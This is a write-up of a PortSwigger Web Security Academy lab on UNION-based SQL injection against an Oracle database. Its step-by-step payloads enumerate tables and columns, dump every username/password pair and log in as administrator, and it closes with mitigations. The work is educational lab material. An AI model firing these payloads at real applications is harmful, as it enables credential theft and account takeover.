# SQL Injection Attack — Listing Database Contents on Oracle

**Difficulty:** Practitioner  
**Lab Source:** PortSwigger Web Security Academy  
**Category:** SQL Injection — UNION Attack  
**Status:** Solved ✅

---

## Overview

This lab demonstrates a **SQL injection vulnerability** in the product category filter of a web application backed by an **Oracle database**. The goal is to:

1. Exploit a UNION-based SQL injection to enumerate the database schema
2. Discover a table containing user credentials
3. Retrieve the `administrator` username and password
4. Log in as `administrator`

---

## Discovered Assets (Real Lab Values)

| Asset | Value |
|---|---|
| Credentials table | `USERS_NBAHEN` |
| Username column | `USERNAME_PBHUYL` |
| Password column | `PASSWORD_XAYXIY` |
| Other table found | `APP_USERS_AND_ROLES` |
| Other tables/cols explored | `users_xgbxrm`, `username_gdzqqj`, `password_qojmen` |

---

## Key Oracle SQL Concepts Used

| Concept | Oracle Syntax |
|---|---|
| Dual table (required for SELECT) | `SELECT 'x' FROM dual` |
| List all tables | `SELECT table_name FROM all_tables` |
| List columns of a table | `SELECT column_name FROM all_tab_columns WHERE table_name='TABLE'` |
| String concatenation | `col1 \|\| col2` |

---

## Step-by-Step Solution (With Real Payloads)

### Step 1 — Intercept the Request

Use **Burp Suite** to intercept the HTTP request that sets the product category filter.  
The vulnerable parameter is `category` in the query string.

---

### Step 2 — Confirm Column Count and Types

Inject a UNION SELECT to confirm the query returns **2 columns**, both of type text.  
`FROM dual` is mandatory in Oracle for constant-value SELECTs.

```sql
'+UNION+SELECT+'abc','def'+FROM+dual--
```

> ⚠️ The payload `'+UNION+SELECT+@@version,'def'+FROM+dual--` **fails** on Oracle.  
> `@@version` is MySQL/MSSQL syntax. Oracle uses `banner FROM v$version`.

---

### Step 3 — Enumerate All Tables

```sql
'+UNION+SELECT+table_name,NULL+FROM+all_tables--
```

**Tables of interest found:**
- `USERS_NBAHEN` ← main credentials table
- `APP_USERS_AND_ROLES` ← also discovered, explored separately

---

### Step 4 — Enumerate Columns of the Credentials Table

```sql
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_NBAHEN'--
```

**Columns found in `USERS_NBAHEN`:**
- `USERNAME_PBHUYL`
- `PASSWORD_XAYXIY`

Also explored `APP_USERS_AND_ROLES`:
```sql
' UNION SELECT NAME, NULL FROM all_tab_columns WHERE table_name = 'APP_USERS_AND_ROLES'--
```

---

### Step 5 — Dump All Credentials

```sql
' UNION SELECT USERNAME_PBHUYL,PASSWORD_XAYXIY FROM USERS_NBAHEN--
```

The response renders all username/password pairs in the product listing area.

---

### Step 6 — Log In as Administrator

Locate the `administrator` row in the dumped results, copy the password, and authenticate at `/login`.

---

## Failed / Exploratory Payloads

| Payload | Outcome |
|---|---|
| `'+UNION+SELECT+@@version,'def'+FROM+dual--` | ❌ Not valid Oracle syntax |
| `' UNION SELECT username_gdzqqj, password_qojmen FROM users_xgbxrm--` | Explored alternate table |
| `' UNION SELECT NAME, NULL FROM all_tab_columns WHERE table_name = 'APP_USERS_AND_ROLES'--` | Enumerated alternate table columns |

---

## Tools Used

- **Burp Suite** — HTTP interception and Repeater for payload testing

---

## Mitigations

- Use **parameterized queries / prepared statements** — never concatenate user input into SQL
- Apply **least privilege** to database accounts (no access to `all_tables`, `all_tab_columns`)
- Implement **input validation and WAF rules**
- Enable **error suppression** in production to avoid leaking schema info
